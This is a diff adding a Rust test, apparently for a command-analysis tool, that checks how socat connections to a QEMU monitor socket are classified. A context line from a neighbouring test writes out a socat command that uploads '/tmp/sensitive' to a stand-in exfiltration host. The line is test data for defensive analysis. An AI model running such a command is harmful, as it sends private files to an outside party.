@@ -185,6 +185,25 @@ fn editor_operands_and_socat_paths_keep_their_effect_roles() {
 }
 
 #[test]
+fn socat_unix_monitor_keeps_socket_provenance_and_opaque_peer_effects() {
+    for prefix in ["UNIX-CONNECT:", "unix-connect:"] {
+        let command = format!("socat - {prefix}/tmp/qemu-monitor.sock");
+        let facts = semantic(&command, "socat");
+        assert_eq!(facts.form_id, "stdio_unix_control");
+        assert!(
+            facts
+                .state_operations
+                .iter()
+                .any(|f| f.domain == StateOperationDomain::RemoteResource
+                    && f.operation == StateOperationKind::Opaque),
+            "{facts:#?}"
+        );
+        assert!(graph(&command).iter().any(|node| matches!(&node.kind, NodeKind::ProvenanceArtifact { artifact: ProvenanceArtifact::NetworkEndpoint { endpoint, usage: ProvenanceEndpointUsage::ControlPlane, .. } } if endpoint.as_deref() == Some("/tmp/qemu-monitor.sock"))), "{:#?}", graph(&command));
+        assert!(!facts.dispatches_child_command);
+    }
+}
+
+#[test]
 fn socat_transfer_direction_and_listener_role_follow_the_native_address_order() {
     let upload = "socat -u file:/tmp/sensitive tcp-connect:exfil.test:12345";
     assert!(
